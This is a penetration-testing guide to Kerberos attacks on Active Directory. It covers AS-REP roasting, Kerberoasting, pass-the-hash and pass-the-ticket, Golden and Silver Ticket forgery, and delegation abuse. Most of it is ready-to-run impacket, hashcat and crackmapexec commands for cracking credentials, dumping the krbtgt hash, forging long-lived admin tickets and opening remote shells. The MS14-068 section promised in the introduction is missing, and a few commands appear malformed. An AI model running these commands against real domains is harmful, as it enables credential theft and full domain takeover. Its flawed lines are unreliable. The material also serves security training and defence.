# Kerberos Attack Techniques Guide

## Introduction and Objective

Kerberos is the default authentication protocol in Active Directory environments, and its design creates several attack surfaces that penetration testers can exploit. Kerberos attacks are among the most impactful techniques in AD assessments because they target the authentication infrastructure itself, often yielding Domain Admin privileges without exploiting traditional software vulnerabilities. This guide covers the complete Kerberos attack chain from reconnaissance through exploitation to domain dominance.

The Kerberos protocol involves three parties: the client (user), the Key Distribution Center (KDC, running on domain controllers), and the service the client wants to access. The KDC issues two types of tickets: the Ticket Granting Ticket (TGT) which authenticates the user to the KDC, and the Ticket Granting Service (TGS) ticket which authenticates the user to a specific service. Each ticket type presents unique attack opportunities.

This guide covers the following Kerberos attack techniques in depth:

1. **AS-REP Roasting** -- Exploiting accounts with pre-authentication disabled to extract crackable hashes
2. **Kerberoasting** -- Requesting TGS tickets for service accounts and cracking them offline
3. **Overpass-the-Hash** -- Converting NTLM hashes into Kerberos TGTs for authentication
4. **Pass-the-Ticket** -- Reusing stolen Kerberos tickets for lateral access
5. **Golden Ticket** -- Forging TGTs with the krbtgt hash for persistent domain admin access
6. **Silver Ticket** -- Forging TGS tickets for targeted service access without KDC interaction
7. **MS14-068 Exploitation** -- Exploiting the PAC vulnerability for privilege escalation

Each technique is presented with complete tool commands, expected output, and practical considerations for real-world engagements.

## Understanding Kerberos Fundamentals

Before executing Kerberos attacks, understanding the protocol flow is essential. The Kerberos authentication process has these key steps:

1. **AS-REQ**: Client sends a timestamp encrypted with their password hash to the KDC, requesting a TGT
2. **AS-REP**: KDC validates the encrypted timestamp (pre-authentication) and returns a TGT encrypted with the krbtgt password hash, plus a session key encrypted with the user's password hash
3. **TGS-REQ**: Client presents the TGT to the KDC, requesting access to a specific service (SPN)
4. **TGS-REP**: KDC returns a TGS ticket encrypted with the service account's password hash, plus a service session key encrypted with the user's session key
5. **AP-REQ**: Client presents the TGS ticket to the target service
6. **AP-REP**: Service validates the ticket and grants access

The critical weaknesses that enable attacks:

- Pre-authentication can be disabled (AS-REP Roasting)
- Any authenticated user can request TGS tickets for any SPN (Kerberoasting)
- The krbtgt hash allows forging TGTs (Golden Ticket)
- Service account hashes allow forging TGS tickets (Silver Ticket)
- NTLM hashes can be converted to Kerberos tickets (Overpass-the-Hash)

## AS-REP Roasting

### Attack Overview

AS-REP Roasting targets user accounts with the "Do not require Kerberos preauthentication" flag enabled (UserAccountControl attribute flag 0x400000). When pre-authentication is disabled, the KDC returns an AS-REP message without the client first proving knowledge of the password. The AS-REP contains a portion encrypted with the user's password-derived key, which can be cracked offline.

### Hands-on Practice

**Step 1**: Identify accounts with pre-auth disabled. Use LDAP queries to enumerate these accounts before attempting the attack.

```bash
# LDAP query to find AS-REP Roastable accounts
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

**Step 2**: Extract AS-REP hashes using GetNPUsers.py.

```bash
# With a user list (no authentication required if usernames are known)
impacket-GetNPUsers corp.local/ -usersfile userlist.txt -format hashcat -outputfile asrep_hashes.txt

# With authenticated access (auto-discovers roastable users)
impacket-GetNPUsers corp.local/svc_ldap:'Password123!' -request -format hashcat -outputfile asrep_hashes.txt

# Target a specific user
impacket-GetNPUsers corp.local/ -user svc_mssql -format hashcat -outputfile asrep_mssql.txt
```

**Step 3**: Crack the extracted hashes offline.

```bash
# With hashcat (mode 18200 for Kerberos 5 AS-REP etype 23)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for extended coverage
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# With John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_john.txt
```

**Step 4**: Validate cracked credentials.

```bash
# Test credential against SMB
crackmapexec smb 10.10.0.1 -u cracked_user -p 'CrackedPassword!'

# Request TGT with cracked credentials
impacket-getTGT corp.local/cracked_user:'CrackedPassword!'
```

## Kerberoasting

### Attack Overview

Kerberoasting is one of the most reliable AD attack techniques. Any authenticated domain user can request a TGS ticket for any service with a registered SPN. The TGS ticket is encrypted with the service account's password hash. Since service accounts often have weak passwords and elevated privileges, offline cracking of these tickets frequently yields high-value credentials.

### Hands-on Practice

**Step 1**: Discover service accounts with SPNs.

```bash
# LDAP query to find all accounts with SPNs
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

**Step 2**: Request TGS tickets for service accounts.

```bash
# List all SPNs and request tickets
impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -request -outputfile tgs_hashes.txt

# Request for a specific high-value service account
impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -request-user svc_mssql -outputfile tgs_mssql.txt

# List SPNs without requesting tickets (reconnaissance)
impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -no-preauth
```

**Step 3**: Crack TGS hashes offline.

```bash
# hashcat mode 13100 for Kerberos TGS-REP etype 23 (RC4)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# With John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
```

**Step 4**: Assess the impact of cracked service accounts.

```bash
# Check group memberships of cracked service account
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" "(sAMAccountName=svc_mssql)" memberOf

# Check if the service account has constrained delegation
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" "(sAMAccountName=svc_mssql)" msDS-AllowedToDelegateTo

# Check for admin access on target systems
crackmapexec smb 10.10.0.5 -u svc_mssql -p 'CrackedPassword!'
```

### Targeting Priorities

Prioritize Kerberoasting targets based on these criteria:

- Accounts with known weak password policies (MSSQL, IIS service accounts)
- Accounts in privileged groups (Domain Admins, Enterprise Admins)
- Accounts with constrained delegation configured
- Accounts with high RID values (manually created, likely weaker passwords)
- Accounts running on high-value target systems identified during enumeration

## Overpass-the-Hash and Pass-the-Ticket

### Attack Overview

Overpass-the-Hash converts an NTLM hash into a Kerberos TGT, enabling the operator to authenticate using Kerberos rather than NTLM. This technique bypasses restrictions that may block NTLM authentication while leveraging previously harvested hashes. Pass-the-Ticket uses stolen Kerberos ticket cache files directly for authentication.

### Hands-on Practice

**Step 1**: Convert NTLM hash to Kerberos TGT (Overpass-the-Hash).

```bash
# Request TGT using NTLM hash
impacket-getTGT corp.local/svc_user -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# Set the ticket for use
export KRB5CCNAME=svc_user.ccache
```

**Step 2**: Use the ticket for authentication.

```bash
# Access systems via psexec with Kerberos
impacket-psexec corp.local/svc_user@dc01.corp.local -k -no-pass

# Access via wmiexec
impacket-wmiexec corp.local/svc_user@fileserver.corp.local -k -no-pass

# Access via crackmapexec with Kerberos cache
crackmapexec smb dc01.corp.local --use-kcache -u svc_user
```

**Step 3**: Request service tickets using the TGT.

```bash
# Request service ticket for a specific SPN
impacket-getST -spn cifs/dc01.corp.local corp.local/svc_user:'Password123!'

# Use the service ticket
export KRB5CCNAME=svc_user@cifs_dc01.corp.local.ccache
impacket-psexec corp.local/svc_user@dc01.corp.local -k -no-pass
```

## Golden Ticket Attack

### Attack Overview

The Golden Ticket attack is the ultimate Kerberos exploitation technique. By forging a TGT using the krbtgt account's password hash, an attacker creates a persistent Domain Admin ticket that survives password resets for all user accounts (only krbtgt resets invalidate Golden Tickets). The forged ticket is created entirely offline and never contacts the KDC during creation.

### Hands-on Practice

**Step 1**: Obtain the krbtgt hash (requires Domain Admin).

```bash
# Extract krbtgt hash via DCSync
impacket-secretsdump corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx \
  -just-dc-user "krbtgt"
```

**Step 2**: Obtain the domain SID.

```bash
# Get domain SID via lookupsid
impacket-lookupsid corp.local/svc_ldap:'Password123!'@10.10.0.1

# Alternative: extract from LDAP
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" "(objectClass=domain)" objectSid
```

**Step 3**: Forge the Golden Ticket.

```bash
# Forge ticket with Domain Admin group memberships
impacket-ticketer \
  -nthash 'krbtgt_ntlm_hash' \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  -user-id 500 \
  -groups 512,513,518,519,520 \
  administrator

# Forge with extended lifetime (10 years for persistence)
impacket-ticketer \
  -nthash 'krbtgt_ntlm_hash' \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  -user-id 500 \
  -groups 512,513,518,519,520 \
  -duration 3650 \
  administrator

# Forge with Extra SID for cross-domain enterprise admin
impacket-ticketer \
  -nthash 'krbtgt_ntlm_hash' \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  -extra-sid S-1-5-21-PARENT-DOMAIN-SID-519 \
  administrator
```

**Step 4**: Use the Golden Ticket.

```bash
export KRB5CCNAME=administrator.ccache

# Access domain controller
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass

# DCSync with Golden Ticket (no password or hash needed)
impacket-secretsdump corp.local/administrator@dc01.corp.local -k -no-pass

# Access any domain system
impacket-wmiexec corp.local/administrator@fileserver.corp.local -k -no-pass
```

## Silver Ticket Attack

### Attack Overview

Silver Tickets are forged TGS tickets created using the service account's password hash. Unlike Golden Tickets, Silver Tickets target specific services and never contact the KDC, making them stealthier. They are useful when you have a service account hash but not the krbtgt hash.

### Hands-on Practice

**Step 1**: Obtain the service account hash for the target service.

```bash
# Extract via DCSync for a specific service account
impacket-secretsdump corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx \
  -just-dc-user "svc_fileserver"
```

**Step 2**: Forge the Silver Ticket for the target service.

```bash
# Forge Silver Ticket for CIFS (file share access)
impacket-ticketer \
  -nthash 'svc_fileserver_hash' \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  -spn cifs/fileserver.corp.local \
  -user-id 500 \
  administrator

# Forge Silver Ticket for LDAP (directory queries)
impacket-ticketer \
  -nthash 'dc01_hash' \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  -spn ldap/dc01.corp.local \
  -user-id 500 \
  administrator

# Forge Silver Ticket for HOST (service management)
impacket-ticketer \
  -nthash 'target_hash' \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  -spn host/target.corp.local \
  -user-id 500 \
  administrator
```

**Step 3**: Use the Silver Ticket.

```bash
export KRB5CCNAME=administrator.ccache

# Access file shares via Silver Ticket
impacket-psexec corp.local/administrator@fileserver.corp.local -k -no-pass -target-ip 10.10.0.10

# Query LDAP via Silver Ticket
impacket-ldapsearch corp.local/administrator@dc01.corp.local -k -no-pass -b "dc=corp,dc=local" "(objectClass=user)"
```

### Common Silver Ticket SPN Types

| SPN Type | Access Gained | Use Case |
|----------|--------------|----------|
| cifs | File shares | Access SMB shares, read/write files |
| ldap | Directory queries | Enumerate AD, extract credentials |
| host | Service management | Create/delete services, scheduled tasks |
| http | Web services | Access web applications as the user |
| mssql | Database access | Query SQL Server databases |
| rpcss | RPC services | WMI execution, COM activation |

## Constrained Delegation Exploitation (S4U)

### Attack Overview

Constrained delegation allows a service to impersonate users to specific backend services. When a service account has constrained delegation configured, an attacker who compromises that account can impersonate any user (including Domain Admins) to the delegated services using the S4U (Service for User) Kerberos protocol extension.

### Hands-on Practice

```bash
# Step 1: Discover accounts with constrained delegation
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" \
  "(&(objectClass=user)(msds-allowedtodelegateto=*))" \
  sAMAccountName msDS-AllowedToDelegateTo

# Step 2: Exploit constrained delegation via S4U
impacket-getST -spn cifs/dc01.corp.local -impersonate administrator \
  corp.local/svc_deleg:'DelegPass123!'

# Step 3: Use the delegated ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass
```

## References and Resources

- [Kerberos Protocol RFC 4120](https://tools.ietf.org/html/rfc4120) -- Official Kerberos protocol specification
- [Impacket Kerberos Module Documentation](https://www.secureauth.com/labs/open-source-tools/impacket) -- Reference for all Impacket Kerberos tools
- [Harmj0y Kerberoasting Research](https://blog.harmj0y.net/activedirectory/kerberoasting-without-a-title/) -- Original Kerberoasting research and technique evolution
- [Sean Metcalf AD Security - Kerberos Attacks](https://adsecurity.org/?p=3458) -- Comprehensive AD Kerberos attack reference
- [MITRE ATT&CK - Kerberos Techniques](https://attack.mitre.org/tactics/TA0006/) -- MITRE framework mapping of Kerberos credential access techniques
- [SANS - Kerberos Attacks and Defense](https://www.sans.org/reading-room/whitepapers/protocols/kerberos-attacks-implicit-unlimited-delegation-36472) -- SANS research on Kerberos attack methodology
- [Tim Medin - Kerberoasting Without Mimikatz](https://www.redsiege.com/blog/2020/04/kerberoasting-without-mimikatz/) -- Practical Kerberoasting techniques using Impacket on Linux
- [Microsoft Kerberos Technical Reference](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview) -- Official Microsoft Kerberos documentation for understanding protocol internals
